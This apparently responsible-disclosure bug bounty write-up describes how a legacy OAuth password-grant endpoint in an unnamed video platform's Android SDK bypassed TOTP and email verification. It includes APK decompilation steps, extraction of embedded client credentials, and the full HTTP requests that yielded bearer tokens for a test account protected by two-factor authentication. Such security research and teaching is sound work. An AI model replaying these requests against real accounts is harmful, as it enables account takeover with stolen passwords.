---
title: "The Forgotten Grant: How a Legacy OAuth Flow in an Android SDK Bypassed 2FA"
published: 2026-09-28
draft: false
tags: ['bug bounty', 'mobile security', 'oauth', 'authentication', 'account takeover']
toc: true
coverImage:
  src: './ATO_banner.gif'
  alt: 'Cover banner representing authentication security research and account takeover'
---

I want to walk through this finding the way it actually happened, not the cleaned-up, textbook version — because in bug bounty, the dead ends, false assumptions, and debugging rabbit holes matter just as much as the final vulnerability payload.

Most writeups make exploitation look like a straight line: you find an endpoint, send a payload, and collect a bounty. Real-world hunting is rarely like that. This finding came from days of frustration against a hardened web application, an instinctive pivot to mobile decompilation, and reading through open-source SDK code on GitHub until an undocumented, legacy OAuth grant surfaced where it never should have been.

---

## Where I Started: Banging My Head Against the Web API

*(Platform name withheld — disclosure pending.)*

Like most engagements against large, mature targets, I started at the most obvious surface: the main web application and its public-facing REST API. 

The target is a massive global video hosting and sharing platform used by millions of creators, businesses, and enterprise accounts. When you're dealing with a company of that scale, their primary web perimeter is usually fortified. Still, you run through the rigorous checklist:

1. **Authentication Flows:** Session cookie generation, OAuth authorization code grant with PKCE, state parameter entropy.
2. **Multi-Factor Enforcement:** How 2FA challenges are gated, whether the session token is issued before or after the OTP step.
3. **Brute Force & Rate Limiting:** Account lockout thresholds, IP throttling on login endpoints, Captcha escalation.
4. **Password Reset:** Token entropy, host header injection, token leakage in Referer headers, race conditions on reset consumption.
5. **Authorization & IDORs:** Manipulating `user_id` parameters across `/api/v3/users/{id}` endpoints.

I spent nearly a week poking at this surface. The web flow was rock solid.

When you logged into the web portal, credentials were submitted to their session endpoint. If an account had Two-Factor Authentication (2FA) enabled, the backend responded with an intermediate, temporary verification state. No authenticated session cookie was set. You were redirected to an MFA challenge screen requiring both a 6-digit TOTP code from an authenticator app and, in many cases, a secondary security code dispatched to the account's registered email address.

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=target_user%40example.com&password=TargetPassword123%21&csrf_token=9a8b...

HTTP/1.1 200 OK
Set-Cookie: temp_auth_step=mfa_pending; Path=/; Secure; HttpOnly

{"status": "mfa_required", "challenge_type": "totp_and_email"}
```

I tried the usual tricks:
- Tampering with the response body (`"mfa_required"` → `"success"`). The downstream backend rejected every subsequent request with `401 Unauthorized` because the actual session context lacked the server-side `mfa_verified` bit.
- Stripping headers, injecting `X-Forwarded-For` spoofing, fuzzing for missing authorization checks on user-scoped endpoints.
- Replaying expired MFA tokens and testing for race conditions during code verification.

Nothing. Not a crack. After days of hunting, my scratchpad was filled with rows of *"Tested: No finding."* 

At this point, many researchers pack up and move to another program. But when a company’s web security is that tight, it often means the engineering team poured all their defensive efforts into the primary browser experience. That raised an immediate question: 

**Is the mobile app playing by the exact same rules, or is it talking to a different world?**

---

## Pivoting to Mobile: Pulling the APK

Web traffic intercepted through Burp Suite only shows you what the client decides to send. It doesn't explain *why* it sends it, what endpoints exist behind feature flags, or what deprecated auth mechanisms the server might still support. To understand that, you have to reverse the client.

I fired up a rooted Android test emulator and pulled the target’s production APK:

```bash
# Locate the installed package path
adb shell pm path com.target.android.targetapp

# Pull the APK to my local workstation
adb pull /data/app/com.target.android.targetapp-1/base.apk targetapp.apk

# Decompile using JADX
jadx-gui targetapp.apk
```

Once the decompilation finished, I didn't want to waste hours navigating through heavily obfuscated ProGuard/R8 class names (`a.a.b.c`). Instead, I immediately checked the application's third-party dependencies and networking configuration.

Opening the decompiled resources and inspecting the package structure revealed a critical clue:

```groovy
// Discovered inside dependency tree / BuildConfig
com.<redacted>.networking:<redacted>-networking-android:3.12.0
```

The app relied heavily on the platform's official, open-source networking library: `<redacted>-networking-android` (the core networking and authentication SDK powering the mobile client).

This was a major shortcut. Instead of reversing minified bytecode, I could inspect the real, unminified source code directly on GitHub.

---

## Code Recon: Hunting for Hidden Grants in the SDK

When you look at public developer documentation for video platforms, OAuth 2.0 authentication is almost universally described as supporting two specific flows:

1. **Client Credentials Grant (`grant_type=client_credentials`):** Used for unauthenticated or app-level requests, like fetching public trending videos or metadata.
2. **Authorization Code Grant (`response_type=code`):** The standard, secure flow where the mobile app opens Chrome Custom Tabs, user logs in via web, approves permissions, and gets redirected back via custom URI scheme (`targetapp://oauth/callback`).

That matched what I had seen on the web. But as I combed through the SDK’s internal Retrofit interface definitions and authentication builders, something bizarre appeared in the code comments and endpoint mappings.

Tucked away in the internal authentication service was a grant type that did not exist in any public-facing API documentation:

```kotlin
// Extracted from Retrofit endpoint definitions in networking SDK
interface AuthService {

    @FormUrlEncoded
    @POST("oauth/authorize/password")
    fun authenticateWithPassword(
        @Header("Authorization") basicAuth: String,
        @Field("grant_type") grantType: String,
        @Field("username") username: String,
        @Field("password") password: String,
        @Field("scope") scope: String
    ): Call<TargetAccount>

    @FormUrlEncoded
    @POST("oauth/authorize/client")
    fun authenticateWithClientCredentials(
        @Header("Authorization") basicAuth: String,
        @Field("grant_type") grantType: String,
        @Field("scope") scope: String
    ): Call<TargetAccount>
}
```

A **Password Grant** (`grant_type=password`) hitting an `/oauth/authorize/password` endpoint!

In the OAuth 2.0 specification (RFC 6749 Section 4.3), this is known as the **Resource Owner Password Credentials (ROPC)** grant. It trades raw user credentials directly for an access token in a single HTTP request. Because it bypasses the browser entirely, it completely circumvents modern authentication defenses: no redirect, no WebAuthn, no browser-based CAPTCHA, and crucially — no interactive multi-factor verification step.

In fact, modern OAuth standards (including OAuth 2.1) officially deprecate ROPC because of these exact architectural hazards. The platform's official developer documentation even stated:

> *"The API does not support the OAuth 2.0 Resource Owner Password Credentials grant."*

Yet the endpoint was sitting right there in the mobile networking library. The question now was: **Was this endpoint still alive and functional in production?**

---

## Dead Ends & Debugging: Getting the Request Right

Knowing an endpoint exists in code and getting a live production server to accept your request are two very different beasts. 

My first attempt was naive. I opened Burp Suite's Repeater, crafted a bare POST request to `/oauth/authorize/password`, and hit send:

### Attempt 1: The Raw POST
```http
POST /oauth/authorize/password HTTP/1.1
Host: api.target.com
Content-Type: application/x-www-form-urlencoded

username=testaccount%40example.com&password=Password123%21&grant_type=password
```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "error": "invalid_client",
  "error_description": "Client authentication failed. Missing Authorization header."
}
```

The endpoint rejected it immediately. The server wasn't just expecting username and password; it required client-level authentication.

### Attempt 2: Missing Headers & Content Negotiation
I went back to the decompiled SDK. How did the library construct requests? 

The SDK’s `Authenticator` class generated an `Authorization: Basic <credentials>` header containing the mobile app's own registered client credentials. When I initially tried sending arbitrary client credentials or omitting specialized headers, the backend threw `406 Not Acceptable` or `400 Bad Request`.

The API gateway was enforcing strict vendor content negotiation and header inspection:
1. `Authorization: Basic <base64(client_id:client_secret)>`
2. `Accept: application/vnd.target.*+json; version=3.4.4`
3. A specific mobile `User-Agent` string identifying the platform client.

### Extracting Client Credentials from the APK
Where did the Android app store its client credentials? 

Unlike web backends where client secrets remain private on server clusters, mobile applications must distribute client credentials inside the binary itself. I searched through the decompiled APK's `res/values/strings.xml` and configuration classes:

```xml
<!-- Found in decompiled res/values/strings.xml -->
<string name="target_client_id">████████████████</string>
<string name="target_client_secret">████████████████████████████████</string>
```

With the real client ID and secret in hand, I generated the Basic Auth token:

```bash
echo -n "client_id:client_secret" | base64
```

Now, I reconstructed the HTTP request to match the exact headers and scope configuration expected by the mobile networking SDK.

---

## The Breakthrough Request

Here is the exact request constructed to match genuine mobile client traffic:

```http
POST /oauth/authorize/password HTTP/1.1
Host: api.target.com
Authorization: Basic ████████████████████████████████████████
User-Agent: com.target.android.targetapp (Google, sdk_gphone64_x86_64, google, Android 12/31 Version 10.8.0) Kotlin <redacted>Networking/3.12.0
Accept: application/vnd.target.*+json; version=3.4.4
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Connection: close
Accept-Encoding: identity
Content-Length: 158

username=testaccount%40example.com&password=TestPassword123%21&grant_type=password&scope=private+public+██████
```

I clicked **Send** in Burp.

### The Response That Made Me Stop

```http
HTTP/1.1 200 OK
Content-Type: application/vnd.target.account+json; version=3.4.4
Cache-Control: no-store
Pragma: no-cache

{
  "access_token": "████████████████████████████████",
  "token_type": "bearer",
  "scope": "private public ██████",
  "app": {
    "name": "Target Android",
    "uri": "/apps/██████"
  },
  "user": {
    "uri": "/users/████████",
    "name": "Security Researcher",
    "account": "basic",
    "email": "testaccount@example.com"
  }
}
```

A **HTTP 200 OK** with a fully-scoped bearer access token!

No redirect. No security prompt. It had issued a valid OAuth token directly from raw credentials in a single round-trip.

However, as any experienced bug hunter knows: **never report too early.**

The test account I had just authenticated was a vanilla test account with no two-factor authentication enabled. Many platforms have legacy or alternate login paths for basic accounts. Having a direct password grant is an architectural bad practice, but unless it bypasses security controls, triagers will often close it as informational or low severity.

The real test was ahead: **What happens when an account has hardened security enabled?**

---

## Proving It Breaks Multi-Factor Authentication

I created a fresh target victim account and hardened it through the web settings:
1. **Two-Factor Authentication (TOTP):** Enabled and bound to Google Authenticator.
2. **Email Login Verification:** Enabled to require a 6-digit confirmation pin sent via email for any unverified login attempt.

### Step 1: Confirming Defense on the Web
I attempted to log in using the web interface:

1. Submitted email and password.
2. Web application immediately blocked access with an MFA challenge:
   > *"Enter the 6-digit verification code from your authenticator app, and enter the security code sent to your email address."*
3. Without providing both valid dynamic codes, the web application refused to establish a session. The defense was functioning perfectly.

```
[Web Login Flow]
Username + Password ──► [Password Validated] ──► [MFA Challenge (TOTP + Email)] ──► [BLOCKED until OTP entered]
```

### Step 2: Firing the Mobile Password Grant
Now came the decisive moment. I took the exact same credentials from the 2FA-protected victim account and sent them to the mobile `/oauth/authorize/password` endpoint:

```http
POST /oauth/authorize/password HTTP/1.1
Host: api.target.com
Authorization: Basic ████████████████████████████████████████
User-Agent: com.target.android.targetapp (Google, sdk_gphone64_x86_64, google, Android 12/31 Version 10.8.0) Kotlin <redacted>Networking/3.12.0
Accept: application/vnd.target.*+json; version=3.4.4
Content-Type: application/x-www-form-urlencoded

username=victim_2fa%40example.com&password=VictimPassword123%21&grant_type=password&scope=private+public+██████
```

**Result:**

```http
HTTP/1.1 200 OK
Content-Type: application/vnd.target.account+json; version=3.4.4

{
  "access_token": "b47c0a91f82d3e45a6b7c8d9e0f1a2b3",
  "token_type": "bearer",
  "scope": "private public ██████",
  "user": {
    "uri": "/users/77182931",
    "name": "Hardened 2FA Victim"
  }
}
```

- **TOTP Authenticator Challenge:** Completely bypassed. Not a single prompt.
- **Email Verification Challenge:** Completely bypassed. Zero security codes sent to the victim's inbox.
- **Bearer Token:** Issued instantly and active.

### Step 3: Validating Full Account Takeover
To verify that this wasn't a restricted or dummy token, I used the issued bearer token against the authenticated user endpoint:

```http
GET /me HTTP/1.1
Host: api.target.com
Authorization: Bearer b47c0a91f82d3e45a6b7c8d9e0f1a2b3
Accept: application/vnd.target.*+json; version=3.4.4
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "uri": "/users/77182931",
  "name": "Hardened 2FA Victim",
  "email": "victim_2fa@example.com",
  "account": "pro",
  "created_time": "2021-04-12T14:22:01+00:00",
  "upload_quota": {
    "space": {
      "free": 21474836480,
      "max": 26843545600,
      "used": 5368709120
    }
  },
  "membership": "pro_annual"
}
```

The response returned the complete authenticated user profile: private videos, unlisted media, billing information, upload quotas, and channel management capabilities.

With nothing more than the primary credentials, the entire multi-factor authentication mechanism had been stripped away without alerting the user or raising a single security exception.

---

## Architectural Breakdown: Why Did This Happen?

How does a mature, security-conscious organization end up with a complete MFA bypass on its primary API?

The answer lies in **divergent authentication architectures** between web and mobile clients:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                             WEB LOGIN PIPELINE                              │
└─────────────────────────────────────────────────────────────────────────────┘
  User Browser
       │
       ▼
 [ Web Gateway ] ──► [ Password Check ] ──► [ 2FA / OTP Enforcer ] ──► [ Authenticated Session ]
                                                     │
                                             (Strictly Gated)

───────────────────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│                            MOBILE LOGIN PIPELINE                            │
└─────────────────────────────────────────────────────────────────────────────┘
  Attacker / App
       │
       ▼
 [ API Gateway ] ──► [ POST /oauth/authorize/password ] ──► [ Token Issuer ] ──► [ Bearer Token Issued! ]
                                                                   │
                                                      (2FA Service Never Queried!)
```

### 1. Front-Channel vs. Identity Provider Enforcement
When the engineering team introduced Two-Factor Authentication and email verification, they implemented the enforcement logic inside the **web application's front-channel session middleware**. The web login controller was programmed to halt the session creation process until the user completed the secondary challenge.

However, the mobile client authenticated against a legacy OAuth backend endpoint that predated the MFA rollout. When that endpoint validated username and password against the identity database, it issued an OAuth access token directly. It was never plumbed into the multi-factor verification service.

### 2. The Fallacy of Mobile Client Secrets
The developers assumed the mobile endpoint was protected because it required client authentication (`Authorization: Basic <credentials>`). 

This is one of the most common architectural mistakes in mobile security: **treating a mobile app as a confidential client**. Under OAuth 2.0 specifications, mobile applications are *public clients*. Any secret embedded in an APK, IPA, or client library can be extracted via static analysis in minutes. Once extracted, any attacker can impersonate genuine mobile app traffic with 100% fidelity.

---

## Impact Summary

| Metric | Assessment |
| :--- | :--- |
| **Vulnerability Type** | Authentication Bypass / 2FA Bypass |
| **Attack Vector** | Direct API request via legacy OAuth 2.0 Password Grant |
| **User Interaction** | None (Zero-click) |
| **Prerequisites** | Valid primary credentials |
| **Severity** | **High** |
| **Impact** | Auth bypass, 2FA bypass, Full Account Takeover (ATO) |

By bypassing both TOTP and email verification:
- 2FA is rendered completely ineffective as a defense against credential reuse.
- Attackers armed with credential lists from third-party data breaches can silently take over high-value accounts without triggering mobile push notifications or email alerts.
- The granted OAuth scopes (`private public ██████`) provide total administrative command over the victim's channel and media.

---

## Takeaways for Security Researchers

If there's one lesson from this hunt, it's this:

1. **Dead ends on the web are signposts to mobile:** When a web application has undergone years of penetration testing and hardening, don't keep banging your head against the same login form. Check how mobile clients, Smart TVs, desktop utilities, and CLI tools authenticate.
2. **Open-source SDKs are goldmines:** If a target publishes an official SDK on GitHub (e.g., Android, iOS, Python, Node.js), review the client source before you touch minified application code. SDK repositories often expose undocumented routes, deprecated grant types, and development headers that never appear in official API docs.
3. **Hunt for deprecated OAuth flows:** Resource Owner Password Credentials (`grant_type=password`) and Implicit Grants are relics of older OAuth architectures. Whenever they linger in production, there's a strong chance they were never updated to enforce modern zero-trust checks like MFA and device verification.
4. **Reconstruct client traffic meticulously:** Don't abandon an endpoint after getting a `401 Unauthorized` or `406 Not Acceptable`. Match the app's real `User-Agent`, vendor-specific `Accept` headers, and embedded client credentials until your request is indistinguishable from genuine app traffic.
5. **Always test against a hardened account:** An alternative login path is a finding; an alternative login path that bypasses 2FA is a **bounty-winning account takeover**. Never stop until you've verified the vulnerability against an account with every security setting turned on.
